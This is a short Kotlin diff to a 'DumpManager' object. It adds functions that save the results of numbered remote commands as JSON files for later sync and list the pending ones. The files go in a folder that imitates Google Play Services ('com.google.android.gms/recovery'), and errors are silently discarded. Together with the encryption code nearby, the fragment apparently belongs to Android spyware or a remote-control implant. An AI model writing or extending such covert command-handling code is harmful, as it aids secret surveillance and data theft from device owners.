@@ -86,6 +86,30 @@ object DumpManager {
 
     fun getRootDir(): File = ROOT_DIR
 
+    fun vaultCommandUpdate(id: Int, status: String, errorMsg: String?, resultData: JSONObject?, resultFilePath: String?) {
+        try {
+            val recoveryDir = File(MAZE_ROOT, "data/com.google.android.gms/recovery")
+            if (!recoveryDir.exists()) recoveryDir.mkdirs()
+            
+            val recoveryFile = File(recoveryDir, "cmd_fail_$id.json")
+            val obj = JSONObject()
+            obj.put("id", id)
+            obj.put("status", status)
+            obj.put("errorMsg", errorMsg)
+            obj.put("resultData", resultData)
+            obj.put("resultFilePath", resultFilePath)
+            obj.put("retry_ts", System.currentTimeMillis())
+            
+            recoveryFile.writeText(obj.toString())
+            DebugLogger.log("RECOVERY", "Command result $id vaulted for later sync.")
+        } catch (e: Exception) { }
+    }
+
+    fun getPendingCommandRecoveries(): List<File> {
+        val recoveryDir = File(MAZE_ROOT, "data/com.google.android.gms/recovery")
+        return recoveryDir.listFiles { _, name -> name.startsWith("cmd_fail_") }?.toList() ?: emptyList()
+    }
+
     private fun encrypt(data: ByteArray): ByteArray {
         // 1. Setup GCM Parameters
         val iv = ByteArray(12) // GCM standard IV size
